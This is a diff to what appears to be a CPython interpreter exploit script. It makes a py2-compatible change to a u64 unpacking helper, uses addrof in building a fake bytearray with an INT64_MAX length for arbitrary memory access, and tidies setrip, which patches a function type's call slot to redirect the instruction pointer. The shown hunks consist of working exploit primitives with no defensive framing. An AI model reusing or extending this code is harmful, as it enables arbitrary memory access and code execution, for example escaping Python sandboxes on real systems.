@@ -33,9 +33,14 @@ def p64a(*n):
 	return [(a >> i) & 0xFF for a in n for i in range(0, 64, 8)]
 
 
+# technically this can unpack an int of any size
+# py2-compatible equivalent of int.from_bytes(n, "little")
 def u64(buf):
-	# TODO: py2 compat
-	return int.from_bytes(buf, "little")
+	n = 0
+	for c in reversed(buf):
+		n <<= 8
+		n += c
+	return n
 
 
 def addrof(obj):
@@ -139,7 +144,7 @@ def getmem():
 	
 	fake_bytearray = bytes(p64a(
 		1,
-		id(bytearray),
+		addrof(bytearray),
 		INT64_MAX,
 		0, 0, 0, 0
 	))
@@ -158,9 +163,9 @@ def setrip(addr, rsi=tuple(), rdx=dict()):
 	my_functype[16*8:16*8 + 8] = p64a(addr)
 	
 	# clear Py_TPFLAGS_HAVE_VECTORCALL in tp_flags (perhaps not necessary?)
-	tp_flags = u64(my_functype[21*8:21*8 + 8])
+	tp_flags = u64(my_functype[21*8 : 21*8 + 8])
 	tp_flags &= ~(1<<11) # Py_TPFLAGS_HAVE_VECTORCALL
-	my_functype[21*8:21*8 + 8] = p64a(tp_flags)
+	my_functype[21*8 : 21*8 + 8] = p64a(tp_flags)
 
 	# get a pointer to our patched function type
 	my_functype_ptr = refbytes(bytes(my_functype))
